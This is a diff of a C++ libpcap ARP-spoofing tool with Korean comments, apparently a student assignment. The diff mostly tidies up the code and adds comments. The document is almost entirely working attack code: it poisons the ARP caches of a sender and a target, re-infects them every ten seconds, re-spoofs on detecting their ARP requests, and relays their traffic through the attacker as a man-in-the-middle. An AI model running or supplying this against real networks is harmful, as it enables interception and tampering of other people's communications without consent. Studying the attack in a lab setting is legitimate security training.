@@ -2,8 +2,6 @@
 #include "hdr/ethhdr.h"
 #include "hdr/arphdr.h"
 
-#define JUMBOBUFSIZ 65535
-
 int main(int argc, char* argv[]) {
     // 1. 인자 개수 검사
     if (argc < 4 || argc % 2 != 0) {
@@ -14,7 +12,7 @@ int main(int argc, char* argv[]) {
     // 2. pcap 핸들 열기
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(dev, JUMBOBUFSIZ, 1, 1000, errbuf);
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); // packet을 1s(1000ms) 단위로 처리
     if (pcap == nullptr) {
         fprintf(stderr, "[Error] couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
@@ -23,16 +21,11 @@ int main(int argc, char* argv[]) {
 
     // 3. 내 MAC/IP 주소 얻기
     Mac myMac = getMyMac(dev);
-    if (myMac.isNull()) {
-        fprintf(stderr, "[Error] Failed to get MAC address for %s\n", dev);
-        return -1;
-    }
     Ip myIp = getMyIp(dev);
 
-    // ============= 디버깅을 위한 출력 추가 =============
-    printf("getMyMac() returned: %s\n", std::string(myMac).c_str());
-    printf("getMyIp()  returned: %s\n", std::string(myIp).c_str());
-    // =================================================
+    // 얻어낸 내 MAC/IP 주소(디버깅 로그)
+    printf("getMyMac() returned: %s\n", string(myMac).c_str());
+    printf("getMyIp()  returned: %s\n", string(myIp).c_str());
 
     // 4. 스푸핑 쌍 목록 생성
     vector<SpoofEntry> entries;
@@ -65,24 +58,25 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-    chrono::steady_clock::time_point last_infect_time = chrono::steady_clock::now();
-
     // 5. 스푸핑 공격
     // 이번 과제의 핵심 로직
     // 주기적 감염 + ARP REQUEST 탐지 + 통신 relay
+    
+    chrono::steady_clock::time_point last_infect_time = chrono::steady_clock::now();
+
     while (true) {
         // 5-1. 주기적 감염(sender와 target 둘 다), 주기: 10초로 설정
         chrono::steady_clock::time_point now = chrono::steady_clock::now();
         if (chrono::duration_cast<chrono::seconds>(now - last_infect_time).count() >= 10) {
             for (SpoofEntry entry : entries) {
                 printf("[Re-infecting] from sender(%s) to target(%s)...\n", string(entry.senderIp).c_str(), string(entry.targetIp).c_str());
-                arp_attack(pcap, entry.senderMac, entry.senderIp, entry.targetIp, myMac); 
-                arp_attack(pcap, entry.targetMac, entry.targetIp, entry.senderIp, myMac);
+                arp_attack(pcap, entry.senderMac, entry.senderIp, entry.targetIp, myMac); // sender에게 내가 target으로 보이도록 공격
+                arp_attack(pcap, entry.targetMac, entry.targetIp, entry.senderIp, myMac); // target에게 내가 sender로 보이도록 공격
             }
             last_infect_time = now;
         }
 
-        // 5-2. ARP recover 방지(re-spoofing 및 relay)
+        // 5-2. ARP recover 방지(re-spoofing) + sender와 target의 통신이 끊어지지 않도록 relay
         struct pcap_pkthdr* header;
         const u_char* packet;
         int res = pcap_next_ex(pcap, &header, &packet);
@@ -95,7 +89,7 @@ int main(int argc, char* argv[]) {
 
         EthHdr* ethHdr = (EthHdr*)packet;
         if (ethHdr->smac() == myMac)
-        continue;
+            continue;
 
         for (SpoofEntry entry : entries) {
             // Sender -> ARP REQUEST(broadcast) 탐지, re-spoofing
@@ -103,26 +97,25 @@ int main(int argc, char* argv[]) {
                 ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
                 if (arpHdr->op() == ArpHdr::REQUEST && arpHdr->smac() == entry.senderMac) {
                     printf("[Re-spoofing] sender(%s) ARP request(broadcast) detected...\n", string(entry.senderIp).c_str());
-                    arp_attack(pcap, entry.senderMac, entry.senderIp, entry.targetIp, myMac);
+                    arp_attack(pcap, entry.senderMac, entry.senderIp, entry.targetIp, myMac); // sender에게 내가 target으로 보이도록 공격
                 }
             }
             // sender와 target의 통신 relay(최종 목적지(sender 혹은 target으로 알맞게 forwarding))
             else if (ethHdr->type() == EthHdr::IP4) {
-                if (ethHdr->smac() == entry.senderMac && ethHdr->dmac() == myMac) {
+                if (ethHdr->smac() == entry.senderMac && ethHdr->dmac() == myMac) { // sender -> target 
                     printf("[Relaying] from sender(%s) to target(%s)...\n", string(entry.senderIp).c_str(), string(entry.targetIp).c_str());
-                    ethHdr->dmac_ = entry.targetMac;
-                    ethHdr->smac_ = myMac;
+                    ethHdr->dmac_ = entry.targetMac;    // dmac을 myMac에서 targetMac으로 변경
+                    ethHdr->smac_ = myMac;              // smac을 senderMac에서 myMac으로 변경
                     pcap_sendpacket(pcap, packet, header->len);
-                } else if (ethHdr->smac() == entry.targetMac && ethHdr->dmac() == myMac) {
+                } else if (ethHdr->smac() == entry.targetMac && ethHdr->dmac() == myMac) { // target -> sender
                     printf("[Relaying] from target(%s) to sender(%s)...\n", string(entry.senderIp).c_str(), string(entry.targetIp).c_str());
-                    ethHdr->dmac_ = entry.senderMac;
-                    ethHdr->smac_ = myMac;
+                    ethHdr->dmac_ = entry.senderMac;    // dmac을 myMac에서 senderMac으로 변경
+                    ethHdr->smac_ = myMac;              // smac을 targetMac에서 myMac으로 변경
                     pcap_sendpacket(pcap, packet, header->len);
                 }
             }
         }
     }
-
     pcap_close(pcap);
     return 0;
 }
